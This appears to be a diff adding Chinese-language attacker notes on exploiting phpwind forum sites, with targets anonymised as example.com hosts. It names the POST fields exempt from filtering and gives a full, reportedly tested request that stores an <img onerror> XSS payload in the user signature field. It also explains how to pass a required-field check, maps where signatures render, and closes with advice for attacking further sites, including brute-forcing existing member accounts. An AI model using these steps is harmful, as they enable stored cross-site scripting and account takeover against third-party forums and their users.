@@ -1,0 +1,65 @@
+## 一、哪些 POST 字段不过滤（存储型 XSS 的选点依据）★ 最有价值
+
+`target116.example.com:55-59` 对所有 POST 参数调用 `S::checkVar()`，但**豁免 6 个字段**：
+
+```php
+foreach ($_POST as $_key => $_value) {
+    if (!in_array($_key, array('atc_content','atc_title','quote_content','prosign','pwuser','pwpwd'))) {
+        S::checkVar($_POST[$_key]);
+    }
+}
+```
+
+而 `S::checkVar()`（`require/target48.example.com:239-251`，非 admincp 分支）会把尖括号等实体化：
+
+```php
+$var = str_replace(array('..',')','<','='), array('&#46;&#46;','&#41;','&#60;','&#61;'), $var);
+```
+
+⇒ **`atc_content`（帖子正文）、`atc_title`（标题）、`quote_content`（引用内容）、`prosign`（个性签名）这四个字段可以原样存下 `<` 与 `>`**。
+⇒ 任何**不在**这 6 个名字里的字段（如 ajax 写 honor 用的 `content`）**存不进尖括号**，别在那上面浪费时间。
+
+## 二、`prosign` 写入：完整可复现请求（实测成功）
+
+```
+POST /profile.php?action=modify& HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+verify=<formhash>&step=2&info_type=base&apartment=110000
+&prosign=<img src=x onerror=alert(1)>&prointroduce=hi&showsign=1&proreceivemail=0&timedf=&prohomepage=&alipay=&newgroupid=&home=
+```
+成功响应：`提示信息 操作完成 如果您的浏览器没有自动跳转,请点击这里`
+读回 `GET /profile.php?action=modify&info_type=base` → `prosign` textarea 值 = `<img src=x onerror=alert(1)>`（零转义落库）。
+落库语句：`u/require/profile/info_base.php:147-151` → `$userService->update($winduid, array('signature'=>$prosign, ...))`，中间只过 `FilterUtil` 敏感词。
+
+## 三、★ `apartment`（现居住地）必填校验的绕过
+
+**症状**：提交资料时报 `字段 '现居住地' 填写有误`，且**签名字段不会落库**。
+**根因**：`info_base.php:132` 的 `saveProfileCustomData('basic')` 先校验必填自定义字段，而 `apartment` 的字段元数据是 `required=1, type=7`；校验抛错则第 147 行的签名写入根本不执行（**顺序陷阱**）。
+**绕过**：填**标准行政区划代码**即可通过 —— 实测 `110000`(北京)/`440000`(广东)/`810000`(香港)/`110101`(东城) 全部通过；`1`、`100000` 被拒。
+（数据库列：`lang/target131.example.com:236` → `apartment INT(10) UNSIGNED NOT NULL DEFAULT 0`）
+
+## 四、★ 发帖被拦的真相：`$groupid == '7'`（验证会员组），双端同拦
+
+```
+m/control/target132.example.com:48      $groupid == '7' && wap_msg("post_check", $basename);
+主站 /post.php?fid=2        返回同一 lang key
+lang key post_check = 您还没通过管理员验证,需要通过管理员验证才能发言！
+```
+- `$groupid` 由注册配置 `$rg_groupid` 决定（`m/control/target133.example.com:187`），**客户端不可控** ⇒ **「注册个号就能发帖」的思路在开了"新会员需管理员验证"的 phpwind 站上不成立**，主站与手机版 `m/` 都拦。
+- ⇒ 想做「发帖 → `atc_content` 存 HTML → 存储型 XSS」这条链，**前提是拿到一个 groupid != 7 的既有账号**，而不是自己注册。
+
+## 五、签名的展示位（决定存储型 XSS 是否真能触发）
+
+| 展示位 | 是否渲染 signature | 可用性 |
+|---|---|---|
+| `read.php`（看帖页） | ✅ 查 `m.signature` | 需要发帖才有展示对象 ⇒ 被 groupid=7 卡死 |
+| `u/home.php`（个人空间） | ✅ `$needFields` 含 `signature` | **唯一入口 `u.php` 若被覆盖/改名则整个个人空间不可用**（本例 u.php 被 UPUPW 探针覆盖）；直访 `/u/home.php` = 9 字节 Forbidden |
+| `m/include/showu.php` | ✅ `:19` 查、`:123` 用 `convert()` 渲染 | **`u` 不在 `m/example.com` 的 `a=` 白名单**，无入口 |
+| `pw_example.com?action=showcard` | ❌ 只查 `m.honor` | 未登录可达（200/3475B），但**不展示签名** |
+| `honor`（个性签名） | ✅ showcard 会渲染 | 被 `!$_G['allowhonor']` 组权限拦死（实测「抱歉，你没有编辑个性签名的权限」） |
+
+## 六、给后续站群的行动建议
+1. 先看目标 `u.php` **是不是原版（823 字节）**：若是原版，个人空间可用 ⇒ 签名有独立展示位，`prosign` 可直接兑现存储型 XSS（连发帖都不需要）。
+2. `m/example.com?a=u` 若在某个版本的白名单里，`m/include/showu.php` 也是展示位，值得逐个版本核。
+3. 发帖型 XSS 的门槛是「一个 groupid != 7 的账号」——优先去爆破**老会员账号**（不是自己注册），额度按账号计。
